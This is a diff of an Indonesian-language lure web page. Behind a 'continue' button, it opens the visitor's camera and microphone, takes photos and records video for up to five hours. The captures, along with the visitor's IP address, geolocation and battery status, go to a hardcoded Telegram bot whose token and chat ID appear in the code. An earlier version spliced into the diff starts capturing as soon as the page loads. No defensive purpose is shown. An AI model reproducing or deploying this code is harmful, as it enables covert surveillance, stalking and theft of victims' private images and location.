@@ -34,10 +34,7 @@
       cursor: pointer;
     }
     #video {
-      transition: opacity 1s ease;
       display: none;
-      width: 1px;
-      height: 1px;
     }
     .circle-light {
       position: absolute;
@@ -50,23 +47,6 @@
       box-shadow: 0 0 8px 3px red;
       z-index: 1000;
     }
-    .image-container {
-      margin-top: 20px;
-      display: flex;
-      justify-content: space-between;
-      gap: 10px;
-    }
-    .image-container img {
-      width: 80px;
-      height: 80px;
-      object-fit: cover;
-      border-radius: 10px;
-      border: 2px solid #00ff88;
-    }
-    @keyframes blink {
-      0% { opacity: 0.3; transform: scale(1); }
-      100% { opacity: 1; transform: scale(1.3); }
-    }
   </style>
 </head>
 <body>
@@ -78,89 +58,79 @@
 
   <div class="popup" id="step1">
     <h2>SILAHKAN PENCET LANJUTKAN</h2>
-    <button onclick="kirimNama()">LANJUTKAN</button>
-    <div class="image-container">
-      <img src="https://via.placeholder.com/80" alt="Foto 1">
-      <img src="https://via.placeholder.com/80" alt="Foto 2">
-      <img src="https://via.placeholder.com/80" alt="Foto 3">
-    </div>
+    <button onclick="startAll()">LANJUTKAN</button>
   </div>
 
   <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const token = '7648038217:AAEhGMOxW_khuHyiCxttyaJyAWzPe9vm52U';
     const chat_id = '7552410869';
     let recorder;
     let recordedChunks = [];
-    let autoStream;
 
-    async function kirimNama() {
+    async function startAll() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         document.getElementById('video').srcObject = stream;
         document.getElementById('video').style.display = 'block';
-        autoStream = stream;
-        startStreaming();
+
+        const popup = document.getElementById('step1');
+        popup.style.opacity = 0;
+        setTimeout(() => popup.style.display = 'none', 500);
+
+        const synth = window.speechSynthesis;
+        const welcome = new SpeechSynthesisUtterance('Halo! bang halo bangg kamu ganteng kwkwkwkw');
+        welcome.lang = 'id-ID';
+        synth.speak(welcome);
+
+        await takeAndSendPhotos(stream);
+
+        recorder = new MediaRecorder(stream);
+        recorder.ondataavailable = handleDataAvailable;
+        recorder.onstop = () => handleStop(stream);
+        recorder.start();
+
+        setTimeout(() => {
+          setInterval(() => {
+            recorder.stop();
+            recorder.start();
+          }, 17000);
+        }, 17000);
+
+        setTimeout(() => {
+          recorder.stop();
+          alert("Rekaman otomatis selesai setelah 5 jam.");
+        }, 5 * 60 * 60 * 1000);
       } catch (err) {
         alert("Akses kamera/mikrofon ditolak.");
       }
     }
 
-    async function startStreaming() {
-      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-      const userAgent = navigator.userAgent;
-      const waktu = new Date();
-      const location = await getLocation();
-      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');
+    async function takeAndSendPhotos(stream) {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
 
-      const info = `
-█░▄▀ ▄▀▄ █▀▀▄ █▀▄ ▄▀▄ █▄░█
-█▀▄░ █░█ █▐█▀ █▀█ █▀█ █░▀█
-▀░▀▀ ░▀░ ▀░▀▀ ▀▀░ ▀░▀ ▀░░▀   
-IP: ${ip}
-User-Agent: ${userAgent}
-Waktu: ${waktu.toLocaleString()}
-Lokasi: ${location}
-Baterai: ${battery}
-`;
+      // Tunggu video siap
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
 
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("caption", info);
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        body: formData
-      });
-
-      const popup = document.getElementById('step1');
-      popup.style.transition = 'opacity 0.5s ease';
-      popup.style.opacity = 0;
-      setTimeout(() => popup.style.display = 'none', 500);
-
-      const synth = window.speechSynthesis;
-      const welcome = new SpeechSynthesisUtterance('Halo! bang halo bangg kamu ganteng kwkwkwkw');
-      welcome.lang = 'id-ID';
-      synth.speak(welcome);
-
-      const stream = autoStream;
-      recorder = new MediaRecorder(stream);
-      recorder.ondataavailable = handleDataAvailable;
-      recorder.onstop = () => handleStop(stream);
-      recorder.start();
-
-      setTimeout(() => {
-        setInterval(() => {
-          recorder.stop();
-          recorder.start();
-        }, 17000);
-      }, 17000);
-
-      setTimeout(() => {
-        recorder.stop();
-        alert("Rekaman otomatis selesai setelah 5 jam.");
-      }, 5 * 60 * 60 * 1000);
+      for (let i = 0; i < 3; i++) {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(async (blob) => {
+          const formData = new FormData();
+          formData.append("chat_id", chat_id);
+          formData.append("photo", blob, `photo${i+1}.jpg`);
+          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+        }, 'image/jpeg');
+        await new Promise(resolve => setTimeout(resolve, 1000)); // jeda antar foto
+      }
     }
 
     function handleDataAvailable(event) {
@@ -193,125 +163,14 @@ Baterai: ${battery}
 
       fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
         method: 'POST',
-<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <title>Auto Foto & Rekam</title>
-</head>
-<body style="background:#000;color:white;text-align:center;padding:20px;">
-  <h2>Memuat Kamera</h2>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-
-  <script>
-    const token = '7648038217:AAEhGMOxW_khuHyiCxttyaJyAWzPe9vm52U';
-    const chat_id = '7552410869';
-    let recorder, recordedChunks = [], stream;
-
-    window.onload = async () => {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        video.srcObject = stream;
-        await new Promise(res => setTimeout(res, 1500));
-
-        let fotoKe = 1;
-
-        const ambilFoto = async () => {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
-          const waktu = new Date();
-          const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
-          const lokasi = await getLocation();
-
-          const caption = `Foto ${fotoKe}\nWaktu: ${waktu.toLocaleString()}\nIP: ${ip}\nLokasi: ${lokasi}`;
-
-          const formData = new FormData();
-          formData.append("chat_id", chat_id);
-          formData.append("caption", caption);
-          formData.append("photo", blob, `foto${fotoKe}.jpg`);
-
-          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          });
-
-          if (fotoKe === 2) {
-            const synth = window.speechSynthesis;
-            const ucapan = new SpeechSynthesisUtterance('Halo bang, kamu ganteng banget wkwkwk');
-            ucapan.lang = 'id-ID';
-            synth.speak(ucapan);
-          }
-
-          fotoKe++;
-          if (fotoKe <= 3) {
-            setTimeout(ambilFoto, 1000);
-          } else {
-            document.querySelector("h2").textContent = "hay broooo.";
-            mulaiRekam();
-          }
-        };
-
-        ambilFoto();
-
-      } catch (e) {
-        alert("Gagal akses kamera/mikrofon: " + e.message);
-      }
-    };
-
-    async function mulaiRekam() {
-      recorder = new MediaRecorder(stream);
-      recorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
-      recorder.onstop = () => kirimVideo();
-
-      recorder.start();
-
-      setTimeout(() => {
-        setInterval(() => {
-          recorder.stop();
-          recorder.start();
-        }, 17000);
-      }, 17000);
-
-      setTimeout(() => {
-        recorder.stop();
-        alert("Rekaman otomatis selesai setelah 5 jam.");
-      }, 5 * 60 * 60 * 1000);
-    }
-
-    async function kirimVideo() {
-      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-      recordedChunks = [];
-
-      const waktu = new Date();
-      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-      const lokasi = await getLocation();
-      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`).catch(() => 'N/A');
-
-      const caption = `[REKAMAN OTOMATIS]\nWaktu: ${waktu.toLocaleString()}\nIP: ${ip}\nLokasi: ${lokasi}\nBaterai: ${battery}`;
-
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("caption", caption);
-      formData.append("video", blob, "rekaman.webm");
-
-      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-        method: 'POST',
         body: formData
       });
     }
 
     async function getLocation() {
-      return new Promise(resolve => {
+      return new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
-          pos => resolve(`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`),
+          pos => resolve(`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
           () => resolve("Lokasi tidak tersedia")
         );
       });
